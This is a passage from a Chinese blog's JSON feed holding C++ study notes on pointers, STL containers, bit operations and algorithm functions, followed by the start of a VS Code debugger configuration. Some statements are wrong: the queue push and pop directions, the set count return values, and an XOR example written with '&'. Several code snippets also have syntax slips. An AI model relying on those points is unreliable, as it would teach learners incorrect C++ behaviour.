class=\"language-c++\">int a[5] = &#123;1, 2, 3, 4, 5&#125;;\nint *p = a;//p的值是数组a的地址\n</code></pre>\n<h2 id=\"c的引用语法\"><a class=\"anchor\" href=\"#c的引用语法\">#</a> C++ 的引用语法</h2>\n<ul>\n<li>\n<p>指针指向一块内存，内部存储的内容是所指的内存的地址</p>\n</li>\n<li>\n<p>引用是模块内存的别名，跟原来的变量实质上是同一个东西。</p>\n</li>\n<li>\n<p>指针和引用都可以作为函数参数，改变实参的值。</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">//和指针类似，相当于给a取个别名\nint&amp; p = a;\n\nint a = 996;\nint *p = &amp;a; // p是指针, &amp;在此是求地址运算\nint &amp;r = a; // r是引用, &amp;在此起标识作用\n</code></pre>\n<h2 id=\"单链表\"><a class=\"anchor\" href=\"#单链表\">#</a> 单链表</h2>\n<pre><code class=\"language-c++\">#include&lt;iostream&gt;\n\nusing namespace std;\n\nstruct Node\n&#123;\n    int val;\n    Node* next;\n    \n    Node(int _val) : val(_val), next(nullptr) &#123;&#125;\n&#125;\nint main()\n&#123;\n    auto p = new Node(1);\n    auto q = new Node(2);\n    auto o = new Node(3);\n    \n    p-&gt;next = q;\n    q-&gt;next = o;\n    \n    Node* head = p;\n    /*添加结点*/\n    Node* u = new Node(4);\n    u-&gt;next = head;\n    head = u;\n    /*删除结点*/\n    head-&gt;next = head-&gt;next-&gt;next;\n    /*链表的遍历*/\n    for(Node* i = head; i; i = i-&gt;next)\n        cout &lt;&lt; i-&gt;val &lt;&lt; endl;\n   \n    return 0;\n&#125;\n</code></pre>\n<h1 id=\"stl\"><a class=\"anchor\" href=\"#stl\">#</a> STL</h1>\n<p>STL 是提高 c++ 编写效率的一个利器。</p>\n<h2 id=\"vector\"><a class=\"anchor\" href=\"#vector\">#</a> vector</h2>\n<p>vector 是<strong>变长数组</strong>，支持<strong>随机访问</strong>，<strong>不支持</strong>在任意位置 O (1) 插入。为了保证效率，元素的增删一般应该在末尾进行。</p>\n<ul>\n<li>利用倍增实现动态增长\n<ul>\n<li>长度不够时进行 1/2 拷贝，n (1/2 + 1/4 + 1/8 + ....)，平均每次时间复杂度是 o (1)</li>\n<li>定义的耗时比数组慢，使用的效率快</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"声明\"><a class=\"anchor\" href=\"#声明\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include &lt;vector&gt; \t//头文件\nvector&lt;int&gt; a;\t\t//相当于一个长度动态变化的int数组\nvector&lt;int&gt; b[233];\t//相当于第一维长233，第二位长度动态变化的int数组\n    \nstruct rec&#123;…&#125;;\nvector&lt;rec&gt; c;\t\t//自定义的结构体类型也可以保存在vector中\n\n//二维数组\nvector&lt;vector&lt;int&gt;&gt; dp(m, vector&lt;int&gt;(n, 0));\n</code></pre>\n<h3 id=\"size-2\"><a class=\"anchor\" href=\"#size-2\">#</a> size( )</h3>\n<ul>\n<li>size 函数返回 vector 的实际长度（包含的元素个数）</li>\n<li>时间复杂度都是 O (1)</li>\n<li>所有的 STL 容器都支持这个方法，含义也相同</li>\n</ul>\n<pre><code class=\"language-c++\">a.size();\n</code></pre>\n<h3 id=\"empty-2\"><a class=\"anchor\" href=\"#empty-2\">#</a> empty( )</h3>\n<ul>\n<li>empty 函数返回一个 bool 类型，表明 vector 是否为空</li>\n<li>时间复杂度都是 O (1)</li>\n<li>所有的 STL 容器都支持这两个方法，含义也相同</li>\n</ul>\n<pre><code class=\"language-c++\">a.empty;\n</code></pre>\n<h3 id=\"clear\"><a class=\"anchor\" href=\"#clear\">#</a> clear</h3>\n<ul>\n<li>clear 函数把 vector 清空，只有 0 个元素</li>\n</ul>\n<pre><code class=\"language-c++\">a.clear();\n</code></pre>\n<h3 id=\"迭代器\"><a class=\"anchor\" href=\"#迭代器\">#</a> 迭代器</h3>\n<p>迭代器就像 STL 容器的 “指针”，可以用星号 “*****”<strong> 操作符解除引用</strong>。</p>\n<pre><code class=\"language-c++\">//一个保存int的vector的迭代器声明方法为：\n//it保存a的首地址，\nvector&lt;int&gt;::iterator it = a.begin();\n</code></pre>\n<h4 id=\"begin\"><a class=\"anchor\" href=\"#begin\">#</a> begin( )</h4>\n<pre><code class=\"language-c++\">a.begin(); === &amp;a[0]\n*a.begin(); === a[0]\n</code></pre>\n<h4 id=\"end\"><a class=\"anchor\" href=\"#end\">#</a> end( )</h4>\n<ul>\n<li>\n<p>左开右闭，[begin, end)</p>\n</li>\n<li>\n<p>end 函数返回 vector 的尾部，即第 n 个元素再往后的 “边界 n + 1“。</p>\n</li>\n<li>\n<p>*a.end () 与 a [n] 都是越界访问，其中 n=a.size ()，即容器长度</p>\n</li>\n</ul>\n<h4 id=\"遍历方法\"><a class=\"anchor\" href=\"#遍历方法\">#</a> 遍历方法</h4>\n<ul>\n<li>\n<p>类似数组</p>\n<pre><code class=\"language-c++\">for(int i = 0; i &lt; a.size(); i++) cout &lt;&lt; a[i] &lt;&lt; ' ';\n//增强for循环\nfor(int x : a) cout &lt;&lt; x &lt;&lt; ' ';\n</code></pre>\n</li>\n<li>\n<p>迭代器遍历</p>\n<pre><code class=\"language-c++\">//可以用auto代替i的类型定义\nfor(vector&lt;int&gt;::iterator i = a.begin(); i != a.end(); i++) cout &lt;&lt; *i &lt;&lt; ' ';\n</code></pre>\n</li>\n</ul>\n<h4 id=\"front-back\"><a class=\"anchor\" href=\"#front-back\">#</a> front / back</h4>\n<ul>\n<li>\n<p>front 函数返回 vector 的第一个元素，等价于 * a.begin () 和 a [0]。</p>\n</li>\n<li>\n<p>back 函数返回 vector 的最后一个元素，等价于 a [a.size () – 1]，a.end () 的前一个位置。</p>\n</li>\n</ul>\n<h4 id=\"push_back-pop_back\"><a class=\"anchor\" href=\"#push_back-pop_back\">#</a> push_back() / pop_back()</h4>\n<ul>\n<li>\n<p>a.push_back (x) 把元素 x 插入到 vector a 的尾部。时间复杂度 o (1)</p>\n</li>\n<li>\n<p>b.pop_back () 删除 vector a 的最后一个元素。时间复杂度 o (1)</p>\n</li>\n</ul>\n<h2 id=\"queue\"><a class=\"anchor\" href=\"#queue\">#</a> queue</h2>\n<p>头文件 queue 主要包括循环队列 queue 和优先队列 priority_queue 两个容器。</p>\n<p><strong>先进先出</strong>的顺序</p>\n<h3 id=\"循环队列queue\"><a class=\"anchor\" href=\"#循环队列queue\">#</a> 循环队列 queue</h3>\n<h4 id=\"声明-2\"><a class=\"anchor\" href=\"#声明-2\">#</a> 声明</h4>\n<pre><code class=\"language-c++\">#include&lt;queue&gt; \t//头文件\nqueue&lt;int&gt; q;\n</code></pre>\n<h4 id=\"操作\"><a class=\"anchor\" href=\"#操作\">#</a> 操作</h4>\n<pre><code class=\"language-c++\">q.push(1);//队头插入一个元素\nq.pop();//弹出队尾元素\nq.front();//返回队头元素\nq.back();//返回队尾元素\n</code></pre>\n<h3 id=\"优先队列priority_queue\"><a class=\"anchor\" href=\"#优先队列priority_queue\">#</a> 优先队列 priority_queue</h3>\n<h4 id=\"声明-3\"><a class=\"anchor\" href=\"#声明-3\">#</a> 声明</h4>\n<pre><code class=\"language-c++\">#include&lt;queue&gt; \t//头文件\npriority_queue&lt;int&gt; q;\t\t// 大根堆(优先返回大的数)\npriority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; q;\t// 小根堆(返回最小值)\npriority_queue&lt;pair&lt;int, int&gt;&gt;q;\n\nstruct rec&#123;\n    int a,b;\n    //重载小于号\n\tbool operator&lt; (const Rec&amp; t) const\n\t&#123;\n\t\treturn a &lt; t.a;//降序出列，从小到大排序，从大到小出列\n        或者\n        return a &gt; t.a;//升序排列，从大到小排序，从小到大出列\n\t&#125;;\n&#125;; \npriority_queue&lt;rec&gt; q;//结构体rec中必须重载小于号函数\n</code></pre>\n<h4 id=\"操作-2\"><a class=\"anchor\" href=\"#操作-2\">#</a> 操作</h4>\n<pre><code class=\"language-c++\">a.push(1);//插入一个数，按顺序自动调整\na.top();//取最大值\na.pop();//删除最大值\n</code></pre>\n<h4 id=\"清空队列\"><a class=\"anchor\" href=\"#清空队列\">#</a> 清空队列</h4>\n<pre><code class=\"language-c++\">q = queue&lt;int&gt;();//重新初始化\n</code></pre>\n<h2 id=\"stack\"><a class=\"anchor\" href=\"#stack\">#</a> stack</h2>\n<h3 id=\"声明-4\"><a class=\"anchor\" href=\"#声明-4\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include &lt;stack&gt;//头文件\nstack&lt;int&gt; stk;\n</code></pre>\n<h3 id=\"操作-3\"><a class=\"anchor\" href=\"#操作-3\">#</a> 操作</h3>\n<pre><code class=\"language-c++\">int x;\nstk.push();//向栈顶插入\nstk.top();//返回栈顶元素\nstk.pop;//弹出删除栈顶元素\nq.size();\t\t//返回栈中元素的个数\nq.empty();\t\t//检查栈是否为空,若为空返回true,否则返回false\n</code></pre>\n<h2 id=\"deque\"><a class=\"anchor\" href=\"#deque\">#</a> deque</h2>\n<ul>\n<li>\n<p>双端队列 deque 是一个支持在两端高效插入或删除元素的连续线性存储空间。它就像是 vector 和 queue 的结合。</p>\n</li>\n<li>\n<p>与 vector 相比，deque 在头部增删元素仅需要 O (1) 的时间，vector 需要 o (n) 时间</p>\n</li>\n<li>\n<p>与 queue 相比，deque 像数组一样支持随机访问。</p>\n</li>\n</ul>\n<h3 id=\"声明-5\"><a class=\"anchor\" href=\"#声明-5\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include&lt;deque&gt;;\ndeque&lt;int&gt; a;\n</code></pre>\n<h3 id=\"操作-4\"><a class=\"anchor\" href=\"#操作-4\">#</a> 操作</h3>\n<pre><code class=\"language-c++\">[] 随机访问\na.begin/end();/*返回deque的头/尾迭代器*/\na.front/back(); /*返回队头/队尾元素*/\na.push_back(1); /*从队尾入队*/\na.push_front(1); /*从队头入队*/\na.pop_back(); /*从队尾出队*/\na.pop_front(); /*从队头出队*/\na.clear(); /*清空队列*/\n</code></pre>\n<h2 id=\"set\"><a class=\"anchor\" href=\"#set\">#</a> set</h2>\n<ul>\n<li>\n<p>头文件 set 主要包括 set 和 multiset 两个容器，分别是 “有序集合” 和 “有序多重集合”</p>\n</li>\n<li>\n<p>前者的元素不能重复，而后者可以包含若干个相等的元素。</p>\n</li>\n<li>\n<p>set 和 multiset 的内部实现是一棵红黑树，它们支持的函数基本相同。</p>\n</li>\n</ul>\n<h3 id=\"声明-6\"><a class=\"anchor\" href=\"#声明-6\">#</a> 声明</h3>\n<pre><code class=\"language-c++\">#include&lt;set&gt;\nusing namespace std;\n\nset&lt;T泛型&gt; name;//定义的标准方式\nset&lt;int&gt; a;//元素不能重复\nmultiset&lt;double&gt; a;//元素可以重复\n\nstruct rec&#123;\n\tint a,b;\n\tbool operator&lt; (const Rec&amp; t) const\n\t&#123;\n\t\treturn a&lt;t.a;\n\t&#125;;//重载小于号，使其从小到大排列，默认小顶堆\n&#125;; \nset&lt;rec&gt; s;\t// 结构体rec中必须重载小于号函数\n</code></pre>\n<h3 id=\"sizeemptyclear\"><a class=\"anchor\" href=\"#sizeemptyclear\">#</a> size/empty/clear</h3>\n<p>与 vector 类似</p>\n<h3 id=\"迭代器-2\"><a class=\"anchor\" href=\"#迭代器-2\">#</a> 迭代器</h3>\n<ul>\n<li>\n<p>set 和 multiset 的迭代器称为 “双向访问迭代器”，不支持 “随机访问”，支持星号 (*) 解除引用，仅支持”++” 和 --“两个与算术相关的操作。</p>\n</li>\n<li>\n<p>设 it 是一个迭代器，例如 set&lt;int&gt;::iterator it;</p>\n</li>\n<li>\n<p>若把 it++，则 it 会指向 “下一个” 元素。这里的 “下一个” 元素是指在元素从小到大排序的结果中，排在 it 下一名的元素。同理，若把 it--，则 it 将会指向排在 “上一个” 的元素。</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">set&lt;int&gt;::iterator it = a.begin();\nit++; it--;\n++it; --it;\n\n//遍历时常用\nfor(it = s.begin(); it != s.end(); it++)\n    printf(&quot;%d\\n&quot;, *it);//解引用\n</code></pre>\n<h3 id=\"beginend\"><a class=\"anchor\" href=\"#beginend\">#</a> begin/end</h3>\n<ul>\n<li>s.begin () 是指向集合中最小元素的迭代器。</li>\n<li>s.end () 是指向集合中<strong>最大元素的下一个位置</strong>的迭代器。换言之，就像 vector 一样，是一个 “前闭后开” 的形式。因此 --s.end () 是指向集合中最大元素的迭代器。</li>\n</ul>\n<h3 id=\"insert元素插入\"><a class=\"anchor\" href=\"#insert元素插入\">#</a> insert 元素插入</h3>\n<ul>\n<li>s.insert (x) 把一个元素 x 插入到集合 s 中</li>\n<li>时间复杂度为 O (logn)。</li>\n<li>在 set 中，若元素已存在，则不会重复插入该元素，对集合的状态无影响。</li>\n</ul>\n<h3 id=\"find\"><a class=\"anchor\" href=\"#find\">#</a> find</h3>\n<ul>\n<li>\n<p>s.find (x) 在集合 s 中查找等于 x 的元素，并返回指向该元素的迭代器。若不存在，则返回 s.end ()。</p>\n<pre><code class=\"language-c++\">if(a.find(x) == a.end()) //判断x在a中是否存在\n</code></pre>\n</li>\n<li>\n<p>时间复杂度为 O (logn)。</p>\n</li>\n</ul>\n<h3 id=\"lower_boundupper_bound\"><a class=\"anchor\" href=\"#lower_boundupper_bound\">#</a> lower_bound/upper_bound</h3>\n<ul>\n<li>s.lower_bound (x) 查找<strong>大于等于</strong> x 的元素中最小的一个，并返回指向该元素的迭代器。</li>\n<li>s.upper_bound (x) 查找<strong>大于</strong> x 的元素中最小的一个，并返回指向该元素的迭代器。</li>\n</ul>\n<h3 id=\"erase\"><a class=\"anchor\" href=\"#erase\">#</a> erase</h3>\n<ul>\n<li>设 x 是一个<strong>元素</strong>，s.erase (x) 从 s 中删除<strong>所有等于 x 的元素</strong>，时间复杂度为 O (k+logn)，其中 k 是被删除的元素个数。</li>\n<li>设 it 是一个<strong>迭代器</strong>，s.erase (it) 从 s 中<strong>删除迭代器 it 指向的元素</strong>，时间复杂度为 O (logn)</li>\n</ul>\n<h3 id=\"count\"><a class=\"anchor\" href=\"#count\">#</a> count</h3>\n<p>s.count (x) 返回集合 s 中<strong>等于 x 的元素个数</strong>，时间复杂度为 O (k +logn)，其中 k 为元素 x 的个数。</p>\n<ul>\n<li>set 不存在返回 1，存在返回 0</li>\n<li>multiset 存在返回个数</li>\n</ul>\n<h2 id=\"map\"><a class=\"anchor\" href=\"#map\">#</a> map</h2>\n<h3 id=\"声明-7\"><a class=\"anchor\" href=\"#声明-7\">#</a> 声明</h3>\n<ul>\n<li>map 容器是一个键值对 key-value 的映射，其内部实现是一棵以 key 为关键码的红黑树。</li>\n<li>Map 的 key 和 value 可以是任意类型，其中 key 必须定义小于号运算符。</li>\n</ul>\n<pre><code class=\"language-c++\">#include&lt;map&gt;\nusing namespace std;\n//程序中默认指定了std命令空间，可以省略std:\nstd::map&lt;std::string, int&gt;mymap&#123;&#123;\"emm\", 10&#125;, &#123;\"STL\", 20&#125;&#125;;\n//创建空容器 + 初始化\nmap&lt;key_type, value_type&gt; name;\n\n//此处和数组差不多\nmap&lt;int, int&gt; a;//二元组\na[1] = 2;\ncout &lt;&lt; a[1] &lt;&lt; endl;\n\nmap&lt;string, vector&lt;int&gt;&gt; a;\na[&quot;hhh&quot;] = vector&lt;int&gt;(&#123;1, 2, 3, 4&#125;);\ncout &lt;&lt; a[&quot;hhh&quot;][2] &lt;&lt; endl;\n\n//重载小于号，使从小到大排列\nstruct Node &#123;  \n\tint d, e;  \n\tbool operator &lt; (const Node x) const \n    &#123;  \n\treturn d &lt; x.d;      //从小到大排序\n    &#125;   \n    Node(int d, int e):d(d), e(e)&#123;&#125;  \n&#125;; \n</code></pre>\n<h3 id=\"sizeemptyclearbeginendcountlower_boundupper_boundmax_sizeswap\"><a class=\"anchor\" href=\"#sizeemptyclearbeginendcountlower_boundupper_boundmax_sizeswap\">#</a> size/empty/clear/begin/end/count/lower_bound/upper_bound/max_size/swap</h3>\n<p>均与 set 类似。</p>\n<h3 id=\"inserterase\"><a class=\"anchor\" href=\"#inserterase\">#</a> Insert/erase</h3>\n<p>与 set 类似，但其参数均是 pair&lt;key_type, value_type&gt;</p>\n<pre><code class=\"language-c++\">a.insert(&#123;&quot;a&quot;, &#123;&#125;&#125;);\n</code></pre>\n<h3 id=\"find-2\"><a class=\"anchor\" href=\"#find-2\">#</a> find</h3>\n<p>h.find (x) 在变量名为 h 的 map 中查找 key 为 x 的二元组，用法与 set 类似。</p>\n<pre><code class=\"language-c++\">a.find(key) == a.end()\n</code></pre>\n<h3 id=\"操作符\"><a class=\"anchor\" href=\"#操作符\">#</a> [ ] 操作符</h3>\n<ul>\n<li>\n<p>h [key] 返回 key 映射的 value 的引用，时间复杂度为 O (logn)。</p>\n</li>\n<li>\n<p>[] 操作符是 map 最吸引人的地方。我们可以很方便地通过 h [key] 来得到 key 对应的 value，还可以对 h [key] 进行赋值操作，改变 key 对应的 value。</p>\n</li>\n</ul>\n<h1 id=\"位运算-常用库函数\"><a class=\"anchor\" href=\"#位运算-常用库函数\">#</a> 位运算、常用库函数</h1>\n<h2 id=\"位运算\"><a class=\"anchor\" href=\"#位运算\">#</a> 位运算</h2>\n<h4 id=\"位运算符\"><a class=\"anchor\" href=\"#位运算符\">#</a> 位运算符</h4>\n<p>移位运算符优先级最高</p>\n<p>&amp; 与</p>\n<pre><code class=\"language-c++\">0 &amp; 0 = 0\n0 &amp; 1 = 0\n1 &amp; 1 = 1\n</code></pre>\n<p>| 或</p>\n<pre><code class=\"language-c++\">0 | 0 = 0\n1| 0 = 1\n0 | 1 = 1\n1 | 1 = 1\n</code></pre>\n<p><strong>~ 非</strong></p>\n<pre><code class=\"language-c++\">~ 0 = 1\n~ 1 = 0\n</code></pre>\n<p><strong>^ 异或</strong></p>\n<p>a⊕b = (¬a ∧ b) ∨ (a ∧¬b)</p>\n<pre><code class=\"language-c++\">0 ^ 0 = 0\n1 ^ 1 = 0\n1 ^ 0 = 1\n    \n//int类型的两个数异或\n3 ^ 6 = (011) &amp; (110) = (101) = 5\n</code></pre>\n<p>&gt;&gt; 右移</p>\n<ul>\n<li>\n<p>右边减一个数字位，相当于 / 2</p>\n</li>\n<li>\n<p>a &gt;&gt; k === a/pow(2, k)</p>\n</li>\n</ul>\n<p>&lt;&lt; 左移</p>\n<ul>\n<li>\n<p>右边加 0，相当于 * 2</p>\n</li>\n<li>\n<p>a &lt;&lt; k === a * pow(2, k)</p>\n</li>\n</ul>\n<h4 id=\"常用操作-2\"><a class=\"anchor\" href=\"#常用操作-2\">#</a> 常用操作：</h4>\n<ul>\n<li>\n<p>求 x 的第 k 位数字 x &gt;&gt; k &amp; 1</p>\n<pre><code class=\"language-c++\">a = 110110\na &gt;&gt; k = 1101\na &gt;&gt; k &amp; 1 = (1101) &amp; (0001) = 1\n</code></pre>\n</li>\n<li>\n<p>lowbit (x) = x &amp; -x，lowbit (x) 为返回 x 的<strong>最后一位 1 和后 i 面的 0</strong></p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">a = 10101100100000\n~a = 01010011011111\n~a + 1 = 01010011100000\na &amp; (~a + 1) = 100000\n负数用补码表示，补码和反码一样\n</code></pre>\n<h3 id=\"常用库函数\"><a class=\"anchor\" href=\"#常用库函数\">#</a> 常用库函数</h3>\n<h4 id=\"reverse-翻转\"><a class=\"anchor\" href=\"#reverse-翻转\">#</a> reverse 翻转</h4>\n<p>时间复杂度为 o（n）</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>翻转一个<strong> vector</strong></p>\n<pre><code class=\"language-c++\">reverse(a.begin(), a.end());\n</code></pre>\n</li>\n<li>\n<p>翻转一个<strong>数组</strong></p>\n<p>左闭右合 [,)</p>\n<pre><code class=\"language-c++\">reverse(a, a + n);\n</code></pre>\n</li>\n<li>\n<p>翻转一个<strong>字符串</strong></p>\n<pre><code class=\"language-c++\">reverse(str.begin(),str.end();\n</code></pre>\n</li>\n</ul>\n<h4 id=\"unique-去重\"><a class=\"anchor\" href=\"#unique-去重\">#</a> unique 去重</h4>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>使用 unique 的容器重复元素<strong>必须靠在一块</strong></li>\n<li>返回去重之后的尾迭代器（或指针），仍然为前闭后开，即这个迭代器是去重之后末尾元素的下一个位置。</li>\n<li>该函数常用于离散化，利用迭代器（或指针）的减法，可计算出去重后的元素个数。</li>\n</ul>\n<p>把一个 vector 去重：</p>\n<pre><code class=\"language-c++\">int m = unique(a.begin(), a.end()) – a.begin();//m为去重后的元素个数\na.erase(unique(a.begin(), a.end()), a.end());//删除后面重复元素，保留前面不重复的部分\n</code></pre>\n<p>把一个数组去重，元素存放在下标 1~n：</p>\n<pre><code class=\"language-c++\">int m = unique(a, a + n) – a;//m为去重后的元素个数\n</code></pre>\n<h4 id=\"random_shuffle-随机打乱\"><a class=\"anchor\" href=\"#random_shuffle-随机打乱\">#</a> random_shuffle 随机打乱</h4>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<p>用法与 reverse 相同</p>\n<pre><code class=\"language-c++\">random_shuffle(a.begin(), a.end());\nrandom_shuffle(a, a + n)\n</code></pre>\n<h4 id=\"sort\"><a class=\"anchor\" href=\"#sort\">#</a> sort</h4>\n<p><strong>头文件：</strong></p>\n<pre><code class=\"language-C++\">#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>对两个迭代器（或指针）指定的部分进行<strong>快速排序</strong></p>\n</li>\n<li>\n<p>参数和 reverse 的用法一样，可以在第三个参数传入定义大小比较的函数，或者重载 “小于号” 运算符。</p>\n</li>\n<li>\n<p>sort () 函数可以对给定区间所有元素进行排序。它有三个参数 &lt; font color='red'&gt;sort (begin, end, cmp)&lt;/font&gt;，其中 begin 为指向待 sort () 的数组的 &lt; font color='red'&gt; 第一个元素的指针 &lt;/font&gt;，end 为指向待 sort () 的数组的 &lt; font color='red'&gt; 最后一个元素的下一个位置的指针 &lt;/font&gt;，cmp 参数为排序准则，cmp 参数 &lt; font color='red'&gt; 可以不写（即为 sort（begin, end））&lt;/font&gt;，<strong>默认从小到大进行排序</strong>。如果我们想从大到小排序可以将 cmp 参数写为 greater&lt;int&gt;() 就是对 int 数组进行排序，当然 &lt;&gt; 中我们也可以写 double、long、float 等等。</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">sort(a.begin(),a.end());//从小到大排序\nsort(a.begin(), a.end(), greater&lt;int&gt;());//从大到小排序\n</code></pre>\n<pre><code class=\"language-c++\">int a[MAX_SIZE];\n//全局函数\nbool cmp(int a, int b)//a是否应该排在b的前面 \n&#123;\n    return a &gt; b; //如果a &gt; b, 那么a应该排在b的前面，则为降序排列\n    或者\n    return a &lt; b;//如果a &lt; b，那么a应该排在b的前面，则为升序排列\n&#125;\nsort(a, a + n, cmp);\n</code></pre>\n<p>把自定义的结构体 vector 排序，重载 “小于号” 运算符：</p>\n<pre><code class=\"language-c++\">struct rec\n&#123;\n    int id, x, y; \n    bool operator &lt;(const rec &amp;t)const \n\t&#123;\n\t\treturn x &lt; t.x;\n\t&#125;\n&#125;\nvector&lt;rec&gt; a;\nsort(a.begin(), a.end()); \n</code></pre>\n<h4 id=\"lower_boundupper_bound-二分\"><a class=\"anchor\" href=\"#lower_boundupper_bound-二分\">#</a> lower_bound/upper_bound 二分</h4>\n<p><strong>头文件：</strong></p>\n<pre><code class=\"language-c++\">#include &lt;algorithm&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>lower_bound 的第三个参数传入一个元素 x，在两个迭代器（指针）指定的部分上执行二分查找，返回指向<strong>第一个大于等于 x</strong> 的元素的位置的<strong>迭代器</strong>（指针）。</p>\n<pre><code class=\"language-c++\">int a[] = &#123;1, 2, 3, 4, 5,, 6&#125;;\nint* p = lower_bound(a, a + 5, 7);\n</code></pre>\n<ul>\n<li>\n<p>有序 int 数组中查找大于等于 x 的最小整数的<strong>下标</strong></p>\n<pre><code class=\"language-c++\">int t = lower_bound(a, a + n, x) – a;\n</code></pre>\n</li>\n<li>\n<p>有序 vector&lt;int&gt; 中查找小于等于 x 的最大整数（假设一定存在）</p>\n<pre><code class=\"language-c++\">int y = upper_bound(a.begin(), a.end(), x) - a.begin();\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>upper_bound 的用法和 lower_bound 大致相同，唯一的区别是查找<strong>第一个大于 x 的元素</strong>。当然，两个迭代器（指针）指定的部分应该是提前排好序的。</p>\n<ul>\n<li>用法与 lower_bound 一致</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/%E7%9F%A5%E8%AF%86%E5%BD%92%E7%BA%B3/",
            "url": "http://yoursite.com/Algorithm/%E7%9F%A5%E8%AF%86%E5%BD%92%E7%BA%B3/",
            "title": "算法知识归纳",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"前置准备\"><a class=\"anchor\" href=\"#前置准备\">#</a> 前置准备</h1>\n<p>vscode 编译器，c/c++ 插件，自动提示 + 编译调试运行</p>\n<p>路径不能出现中文，配置 launch.json 和 tasks.json 两个文件</p>\n<p><strong>launch.json</strong></p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token property\">\"configurations\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token property\">\"name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C/C++: g++.exe 生成和调试活动文件\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token property\">\"type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"cppdbg\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token property\">\"request\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"launch\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token property\">\"program\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\\\\$&#123;fileBasenameNoExtension&#125;.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token property\">\"args\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token property\">\"stopAtEntry\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token property\">\"cwd\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"$&#123;fileDirname&#125;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token property\">\"environment\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token property\">\"externalConsole\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token property\">\"MIMode\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"gdb\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token property\">\"miDebuggerPath\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"D:\\\\mingw64\\\\bin\\\\gdb.exe\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token property\">\"setupCommands\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"为 gdb 启用整齐打印\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token property\">\"text\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"-enable-pretty-printing\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                    <span class=\"token property\">\"ignoreFailures\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    <span class=\"token property\">\"description\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"将反汇编风格设置为 Intel\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                    <span class=\"token property\">\"text\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"-gdb-set disassembly-flavor intel\"</span><span class=\"token 